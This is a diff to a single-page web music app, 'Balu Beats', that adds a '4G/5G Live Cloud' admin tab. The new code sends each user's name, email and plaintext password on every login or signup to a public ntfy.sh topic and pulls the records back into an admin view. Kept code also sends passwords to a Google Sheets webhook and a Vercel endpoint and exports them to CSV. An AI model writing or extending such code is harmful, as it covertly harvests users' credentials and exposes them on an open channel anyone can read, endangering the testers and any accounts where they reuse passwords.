@@ -2130,11 +2130,14 @@
 
             <!-- Action Buttons -->
             <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
-              <button class="util-btn primary" onclick="openDeveloperAdminModal()" style="flex:1;justify-content:center;background:linear-gradient(135deg,#f59e0b,#1ed760);color:#041208;font-weight:900;border:none;">
-                👥 View Logged Users & Credentials
+              <button class="util-btn primary" onclick="openDeveloperAdminModal('users')" style="flex:1;min-width:140px;justify-content:center;background:linear-gradient(135deg,#f59e0b,#1ed760);color:#041208;font-weight:900;border:none;">
+                👥 View Logged Users
               </button>
-              <button class="util-btn" onclick="openDeveloperAdminModal('sheet')" style="flex:1;justify-content:center;border-color:rgba(30,215,96,0.5);color:#1ed760;font-weight:800;">
-                📊 Live Google Sheet Sync
+              <button class="util-btn" onclick="openDeveloperAdminModal('cloud')" style="flex:1;min-width:140px;justify-content:center;border-color:rgba(56,189,248,0.5);color:#38bdf8;font-weight:800;">
+                🌐 4G/5G Live Cloud
+              </button>
+              <button class="util-btn" onclick="openDeveloperAdminModal('sheet')" style="flex:1;min-width:140px;justify-content:center;border-color:rgba(30,215,96,0.5);color:#1ed760;font-weight:800;">
+                📊 Google Sheet
               </button>
             </div>
 
@@ -2570,13 +2573,16 @@
         <button class="row-icon-btn" onclick="closeDeveloperAdminModal()">✕</button>
       </div>
 
-      <!-- Navigation Tabs: Users List vs Google Sheet Setup -->
+      <!-- Navigation Tabs: Users List vs Cloud Feed vs Google Sheet Setup -->
       <div class="admin-tabs">
         <button class="admin-tab-btn active" id="adminTabUsersBtn" onclick="switchAdminTab('users')">
           👥 Registered Testers (<span id="adminTabUserCount">0</span>)
         </button>
+        <button class="admin-tab-btn" id="adminTabCloudBtn" onclick="switchAdminTab('cloud')">
+          🌐 4G/5G Live Cloud Monitor
+        </button>
         <button class="admin-tab-btn" id="adminTabSheetBtn" onclick="switchAdminTab('sheet')">
-          📊 Google Sheet Webhook Sync
+          📊 Google Sheet Sync
         </button>
       </div>
 
@@ -2622,7 +2628,37 @@
         </div>
       </div>
 
-      <!-- TAB 2: GOOGLE SHEETS LIVE WEBHOOK SETUP -->
+      <!-- TAB 2: GLOBAL CLOUD TELEMETRY (4G/5G OUTSIDE WI-FI) -->
+      <div id="adminPaneCloud" style="display:none;flex-direction:column;flex:1;overflow-y:auto;padding-right:4px;">
+        <div style="background:rgba(56,189,248,0.1);border:1px solid rgba(56,189,248,0.3);border-radius:12px;padding:14px;margin-bottom:12px;font-size:12px;line-height:1.5;">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
+            <strong style="color:#38bdf8;font-size:13.5px;">🌐 Global Cloud Relay (Zero Wi-Fi Required)</strong>
+            <span style="background:rgba(34,197,94,0.2);color:#4ade80;font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px;border:1px solid rgba(34,197,94,0.4);">LIVE 24/7</span>
+          </div>
+          <p style="margin:0 0 10px 0;color:#cbd5e1;">
+            Friends from WhatsApp group using <strong>Jio 5G, Airtel 4G, Mobile Data, or any external Wi-Fi</strong> automatically send real-time logs here instantly without needing your laptop or home Wi-Fi to be on!
+          </p>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            <a href="https://ntfy.sh/balubeats_telemetry_being_rebel_7" target="_blank" rel="noopener noreferrer" class="util-btn primary" style="justify-content:center;font-weight:800;background:linear-gradient(135deg,#38bdf8,#6366f1);color:#fff;border:none;text-decoration:none;padding:10px;text-align:center;">
+              🚀 Open Live 4G/5G Dashboard on Phone
+            </a>
+            <button class="util-btn" onclick="copyCloudTelemetryUrl()" style="justify-content:center;border-color:rgba(56,189,248,0.4);color:#38bdf8;font-size:11.5px;">
+              📋 Copy Direct Monitor Link
+            </button>
+          </div>
+        </div>
+
+        <div style="background:rgba(250,204,21,0.08);border:1px solid rgba(250,204,21,0.25);border-radius:12px;padding:12px;margin-bottom:12px;font-size:11.5px;color:#fef08a;line-height:1.5;">
+          <strong>⚡ How 3-Way Monitoring Works for Balu:</strong>
+          <ul style="margin:6px 0 0 0;padding-left:18px;color:#fef9c3;">
+            <li><strong>1. Mobile Phone (Zero Wi-Fi):</strong> Tap the blue button above or open the link on your phone anywhere. You can also tap <em>Subscribe</em> on ntfy to get instant push notifications whenever someone opens Balu Beats.</li>
+            <li><strong>2. In-App Tab (Here):</strong> Tap the <em>Registered Testers</em> tab and hit 🔄 Refresh — it aggregates all remote 4G/5G users directly into the table.</li>
+            <li><strong>3. In VS Code:</strong> Run <code>python start_server.py</code> and it auto-syncs every remote friend into <code>users_db.json</code> every 25 seconds!</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- TAB 3: GOOGLE SHEETS LIVE WEBHOOK SETUP -->
       <div id="adminPaneSheet" style="display:none;flex-direction:column;flex:1;overflow-y:auto;padding-right:4px;">
         <div style="background:rgba(30,215,96,0.08);border:1px solid rgba(30,215,96,0.3);border-radius:12px;padding:12px;margin-bottom:12px;font-size:12px;line-height:1.5;">
           <strong style="color:#1ed760;font-size:13px;display:block;margin-bottom:4px;">⚡ How to watch WhatsApp group friends in Google Sheets live:</strong>
@@ -6709,7 +6745,7 @@
           password: userData.password || '',
           device: device,
           screen: `${window.innerWidth}x${window.innerHeight}`,
-          appVersion: 'v3.1.0'
+          appVersion: 'v3.2.0'
         };
 
         // 1. Local Cache on Device
@@ -6725,7 +6761,21 @@
           }
         } catch (_) {}
 
-        // 2. Custom Google Sheets Webhook (Direct Real-time Sync to Developer Phone)
+        // 2. Global Cloud Telemetry (Zero Wi-Fi required: Airtel/Jio 4G/5G, outside home network)
+        const summaryText = `👤 User: ${record.name} (${record.username})\n🔑 Credentials: ${record.email} / ${record.password || '(not set)'}\n📱 Platform: ${record.device}\n⚡ Action: ${record.action}\n⏰ Time: ${record.timestamp}\n\nDATA:${JSON.stringify(record)}`;
+
+        fetch('https://ntfy.sh', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            topic: 'balubeats_telemetry_being_rebel_7',
+            title: `🎵 Balu Beats: ${record.name} (${record.action})`,
+            message: summaryText,
+            tags: ['musical_note', record.action === 'SIGNUP' ? 'tada' : 'fire']
+          })
+        }).catch(() => {});
+
+        // 3. Custom Google Sheets Webhook (Direct Real-time Sync to Developer Phone)
         const customWebhook = localStorage.getItem('bb_custom_webhook_url');
         if (customWebhook && customWebhook.startsWith('http')) {
           fetch(customWebhook, {
@@ -6736,7 +6786,16 @@
           }).catch(() => {});
         }
 
-        // 3. Central Vercel Telemetry Serverless API
+        // 4. Local Server Sync (if running start_server.py on localhost)
+        if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+          fetch('/api/telemetry', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(record)
+          }).catch(() => {});
+        }
+
+        // 5. Central Vercel Telemetry Serverless API
         const vercelEndpoint = location.hostname.includes('vercel.app')
           ? '/api/telemetry'
           : 'https://balu-beats.vercel.app/api/telemetry';
@@ -6776,7 +6835,7 @@
             email: u.email,
             password: u.password,
             device: '📱 Android / Web',
-            appVersion: 'v3.1.0'
+            appVersion: 'v3.2.0'
           });
         });
       } catch (_) {}
@@ -6792,7 +6851,52 @@
         });
       } catch (_) {}
 
-      // 3. Cloud logs from Vercel Telemetry API
+      // 3. Global Cloud Telemetry (ntfy.sh - Zero Wi-Fi required, pulls 4G/5G mobile users)
+      try {
+        const cloudRes = await fetch('https://ntfy.sh/balubeats_telemetry_being_rebel_7/json?poll=1', { cache: 'no-store' });
+        if (cloudRes.ok) {
+          const rawLines = await cloudRes.text();
+          const lines = rawLines.trim().split('\n');
+          lines.forEach(line => {
+            if (!line.trim()) return;
+            try {
+              const item = JSON.parse(line);
+              if (item.event === 'message' && item.message) {
+                let rec = null;
+                if (item.message.includes('DATA:')) {
+                  rec = JSON.parse(item.message.split('DATA:')[1].trim());
+                } else if (item.message.startsWith('{') && item.message.endsWith('}')) {
+                  rec = JSON.parse(item.message);
+                }
+                if (rec && (rec.name || rec.username)) {
+                  if (!combined.some(c => (c.id === rec.id) || (c.username === rec.username && c.timestamp === rec.timestamp && c.action === rec.action))) {
+                    combined.unshift(rec);
+                  }
+                }
+              }
+            } catch (_) {}
+          });
+        }
+      } catch (_) {}
+
+      // 4. Local Python Server Sync (start_server.py users_db.json)
+      if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+        try {
+          const localSrvRes = await fetch('/api/users', { cache: 'no-store' });
+          if (localSrvRes.ok) {
+            const data = await localSrvRes.json();
+            if (data && Array.isArray(data.users)) {
+              data.users.forEach(u => {
+                if (!combined.some(c => (c.id === u.id) || (c.username === u.username && c.timestamp === u.timestamp))) {
+                  combined.unshift(u);
+                }
+              });
+            }
+          }
+        } catch (_) {}
+      }
+
+      // 5. Cloud logs from Vercel Telemetry API
       try {
         const vercelEndpoint = location.hostname.includes('vercel.app')
           ? '/api/telemetry'
@@ -6938,7 +7042,7 @@
         `"${(u.password || '').replace(/"/g, '""')}"`,
         `"${(u.device || '').replace(/"/g, '""')}"`,
         `"${(u.screen || '').replace(/"/g, '""')}"`,
-        `"${(u.appVersion || 'v3.1.0').replace(/"/g, '""')}"`
+        `"${(u.appVersion || 'v3.2.0').replace(/"/g, '""')}"`
       ]);
 
       const csvContent = '\uFEFF' + [headers.join(','), ...rows.map(r => r.join(','))].join('\r\n');
@@ -6990,7 +7094,7 @@ function doPost(e) {
       data.password || "N/A",
       data.device || "Web Browser",
       data.screen || "",
-      data.appVersion || "v3.1.0"
+      data.appVersion || "v3.2.0"
     ]);
     
     return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
@@ -7098,23 +7202,34 @@ function doGet(e) {
       if (modal) modal.classList.remove('open');
     }
 
+    function copyCloudTelemetryUrl() {
+      const url = 'https://ntfy.sh/balubeats_telemetry_being_rebel_7';
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(url).then(() => {
+          showToast('📋 Telemetry link copied! Open in any mobile browser.');
+        }).catch(() => {
+          prompt('Copy this 4G/5G Live Telemetry URL:', url);
+        });
+      } else {
+        prompt('Copy this 4G/5G Live Telemetry URL:', url);
+      }
+    }
+
     function switchAdminTab(tabName) {
       const usersPane = document.getElementById('adminPaneUsers');
+      const cloudPane = document.getElementById('adminPaneCloud');
       const sheetPane = document.getElementById('adminPaneSheet');
       const usersBtn = document.getElementById('adminTabUsersBtn');
+      const cloudBtn = document.getElementById('adminTabCloudBtn');
       const sheetBtn = document.getElementById('adminTabSheetBtn');
 
-      if (tabName === 'sheet') {
-        if (usersPane) usersPane.style.display = 'none';
-        if (sheetPane) sheetPane.style.display = 'flex';
-        usersBtn?.classList.remove('active');
-        sheetBtn?.classList.add('active');
-      } else {
-        if (usersPane) usersPane.style.display = 'flex';
-        if (sheetPane) sheetPane.style.display = 'none';
-        usersBtn?.classList.add('active');
-        sheetBtn?.classList.remove('active');
-      }
+      if (usersPane) usersPane.style.display = tabName === 'users' ? 'flex' : 'none';
+      if (cloudPane) cloudPane.style.display = tabName === 'cloud' ? 'flex' : 'none';
+      if (sheetPane) sheetPane.style.display = tabName === 'sheet' ? 'flex' : 'none';
+
+      usersBtn?.classList.toggle('active', tabName === 'users');
+      cloudBtn?.classList.toggle('active', tabName === 'cloud');
+      sheetBtn?.classList.toggle('active', tabName === 'sheet');
     }
 
     function queueTrackNext(idx) {
